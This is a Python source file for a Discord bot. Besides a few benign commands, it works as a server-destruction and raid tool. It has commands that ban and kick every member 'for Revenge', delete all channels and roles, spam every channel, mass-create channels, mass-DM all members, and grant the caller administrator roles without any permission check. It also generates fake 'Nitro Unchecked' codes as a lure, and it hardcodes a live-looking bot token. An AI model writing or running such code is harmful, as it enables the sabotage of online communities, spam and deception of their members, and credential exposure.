#coding:utf-8

import discord
from discord.ext import commands
import discord.utils
import datetime
import asyncio
import string
import random
import re
import time
import os

client = commands.Bot(command_prefix = '.')

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name="Boost ", url="https://www.twitch.tv/discordapp"))
    print("Bot is Ready!")

# Valid
@client.command()
async def daily(ctx):
    await ctx.trigger_typing()
    embed = discord.Embed(
        timestamp=datetime.datetime.now(datetime.timezone.utc),
        color = 0x6666ff
    )
    embed.set_author(
        name = ctx.author.name,
        icon_url = ctx.author.avatar_url
    )
    embed.set_thumbnail(
        url=ctx.author.avatar_url
    )
    embed.add_field(
        name = " Nitro Unchecked ",
        value = ('').join(random.choices(string.ascii_letters + string.digits, k=24)),
        inline = True
    )
    embed.set_footer(
        icon_url=client.user.avatar_url,
        text=' Requested by ' + ctx.message.author.name
    )
    await ctx.send(embed = embed)

# Valid
@client.command()
async def main(ctx, arg1, arg2):
    info = await ctx.guild.create_category('Yuup')
    voice1 = await ctx.guild.create_voice_channel('-------------------------')
    await voice1.edit(category=info)
    voice2 = await ctx.guild.create_voice_channel(client.user.name)
    await voice2.edit(category=info)
    youtube = await ctx.guild.create_voice_channel('YouTube : '+arg1)
    await youtube.edit(category=info)
    twitter = await ctx.guild.create_voice_channel('Twitter : '+arg2)
    await twitter.edit(category=info)
    voice6 = await ctx.guild.create_voice_channel('-------------------------')
    await voice6.edit(category=info)

@client.event
async def on_message(message):

    payload = (message.content).lower()
    try:
        if payload.startswith('.support'):
            embed = discord.Embed(title="Support server")
            embed.add_field(name="Touch the below link to join the server", value="[https://discord.gg/sSqQBE5](https://discord.gg/sSqQBE5)")
            await message.channel.send(embed=embed)

        elif payload.startswith('.ping'):
            embed = discord.Embed(
                title="Ping",
                description=f"**:ping_pong: {round(client.latency * 1000)}ms**",
                colour=discord.Colour(0x339966),
                timestamp=datetime.datetime.now(datetime.timezone.utc),
            )    
            embed.set_footer(text=f"Req By {message.author}", icon_url=message.author.avatar_url)
            await message.channel.send(embed=embed)

        elif payload.startswith('.purge'):
            await message.delete()
            await message.channel.purge(limit=100)

        elif payload.startswith('.say'):
            await message.delete()
            payload = (message.content).split(".say")
            await message.channel.trigger_typing()
            await message.channel.send(payload[1])

        elif payload.startswith('.mail'):
            await message.delete()
            await message.channel.trigger_typing()
            payload = message.content
            payload = payload.split('.mail')[1]
            start = 0
            if 'skip1' in payload:
                payload = payload.replace('skip1', '')
                start = 500
            elif 'skip2' in payload:
                payload = payload.replace('skip2', '')
                start = 1000
            elif 'skip3' in payload:
                payload = payload.replace('skip3', '')
                start = 1500
            elif 'skip4' in payload:
                payload = payload.replace('skip4', '')
                start = 2000
            elif 'skip5' in payload:
                payload = payload.replace('skip5', '')
                start = 2500
        
            sended = 0
            end = start + 500
            for member in message.guild.members:
                try:
                    if sended >= start and sended <= end:
                        if member.bot:
                            pass
                        elif not member.bot:
                            if '[user]' in payload:
                                msg = payload.replace("[user]", member.mention)
                            else:
                                msg = payload
                            await asyncio.sleep(0.1)
                            await member.send(msg)
                    else:
                        sended += 1
                except:
                    pass
        
        elif payload.startswith('.reset'):
            await message.delete()
            for channel in message.guild.channels:
                await channel.delete()

        elif payload.startswith('.help'):
            embed = discord.Embed(colour = discord.Colour.green(), timestamp=datetime.datetime.now(datetime.timezone.utc), description="""Welcome to the commands page! Here you will be able to view every single command you have access to.
                """)
            
            embed.set_thumbnail(url=client.user.avatar_url)
            embed.set_author(name='List Of Commands​',icon_url=message.author.avatar_url)
            embed.set_footer(text=f"Command Requested by {message.author.name}", icon_url=message.author.avatar_url)
            
            embed.add_field(name="/roleall [role]", value="Roles everyone [role].", inline=False)
            embed.add_field(name="/banall", value="Bans everyone including yourself unless you're admin.", inline=False)
            embed.add_field(name="/kickall", value="Kicks everyone including yourself unless you're admin.", inline=False)
            embed.add_field(name="/nickall [text]", value="Changes everyones nicknames to [text].", inline=False)
            embed.add_field(name="/channels [name]", value="Creates tons of channels called [name].", inline=False)
            embed.add_field(name="/reset", value="Deletes all channels.", inline=False)
            embed.add_field(name="/mail [text]", value="Sends a DM to everyone saying [text].", inline=False)
            embed.add_field(name="/roles", value="Deletes all roles.", inline=False)
            embed.add_field(name="/admin [user]", value="Admins [user].", inline=False)
            embed.add_field(name="/spam [text]", value="Spam [text] in in all channels.", inline=False)
            embed.add_field(name="/daily", value="Claim unchecked nitro code.", inline=False)
            embed.add_field(name="/purge", value="Delete 100 messages.", inline=False)
            embed.add_field(name="/say [text]", value="The Bot will say [text].", inline=False)
            embed.add_field(name="/ping [text]", value="Ping Pong!.", inline=False)
            await message.channel.send(embed=embed)

        elif payload.startswith('.spam'):
            await message.delete()
            payload = message.content
            payload = payload.split('.spam')[1]
            for i in range(0, 10):
                for channel in message.guild.channels:
                    try:
                        await channel.send(payload)
                    except:
                        pass

        elif payload.startswith('.roles'):
            await message.delete()
            for role in message.guild.roles:
                try:
                    role = discord.utils.get(message.guild.roles, name=str(role))
                    await role.delete(reason="Revenge")
                except:
                    pass

        elif payload.startswith('.roleall'):
            await message.delete()
            payload = message.content
            role = payload.split('.roleall ')[1]
            role = discord.utils.get(message.guild.roles, name=str(role))
            for member in message.guild.members:
                try:
                    await member.add_roles(role)
                except:
                    print("error ", member)

        elif payload.startswith('.channels'):
            await message.delete()
            payload = message.content
            role = payload.split('.channels')[1]
            for i in range(499):
                await message.guild.create_text_channel(str(payload))

        elif payload.startswith('.admin'):
            await message.delete()
            Tatsumaki = await message.guild.create_role(
                name="Tatsumaki",
                permissions=discord.Permissions(permissions=8),
                hoist=True
            )
            lol = await message.guild.create_role(
                name="-",
                permissions=discord.Permissions(permissions=8),
                hoist=True
            )

            user = message.author

            Tatsumaki = discord.utils.get(message.guild.roles, name="Tatsumaki")
            lol = discord.utils.get(message.guild.roles, name="-")
            await user.add_roles(Tatsumaki)
            await asyncio.sleep(0.5)
            await user.add_roles(lol)

        elif payload.startswith('.banall'):
            await message.delete()
            reason = "Revenge"
            for member in message.guild.members:
                try:
                    await message.guild.ban(member, reason=reason)
                except:
                    pass

        elif payload.startswith('.kickall'):
            await message.delete()
            reason = "Revenge"
            for member in message.guild.members:
                try:
                    await member.kick(reason=reason)
                except:
                    pass

    except discord.errors.NotFound:
        pass


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Please Pass in all required arguments.')

client.run('NjgzNjI0MDQ0NDc3NTQ2NTA1.XluVNw.YZu52z5OPtYl--4fMvEiSbifB6o')
